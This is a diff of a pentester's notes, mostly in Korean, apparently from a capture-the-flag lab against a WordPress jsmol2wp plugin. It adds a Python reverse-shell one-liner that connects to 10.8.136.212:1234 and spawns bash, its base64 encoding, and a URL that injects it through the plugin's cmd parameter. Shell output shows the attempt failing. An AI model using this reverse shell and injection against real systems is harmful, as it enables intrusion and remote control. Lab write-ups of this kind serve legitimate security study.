@@ -500,6 +500,26 @@ cmd
 └─# printf "\143\155\x64"
 cmd
 
-# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행한다는 것을 알 수 있음 -> eval: 문자열을 자바스크립트로 실행하는 메소드
+# base64로 인코딩한 것을 디코딩하여 자바스크립트를 실행한다는 것을 알 수 있음 -> 그렇다면 악성 RCE 명령어를 base64 로 encode 만 하면 될 것으로 보임
 
-# 시스템 접근을 위해 reverse shell 을 만들고 encode 하기
+echo -n "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.136.212",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")" | base64
+
+# payload manipulation
+
+aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
+VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
+dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
+KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
+
+# connecting to the target -> SSRF successful URL manipulation
+
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?cmd=aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F
+VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k
+dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v
+KCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKC9iaW4vYmFzaCk=
+
+# fail -> maybe directory listing...?
+
+No such file or directory
+bash: VCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoMTAuOC4xMzYuMjEyLDEyMzQpKTtvcy5k: command not found
+bash: dXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5v: command not found
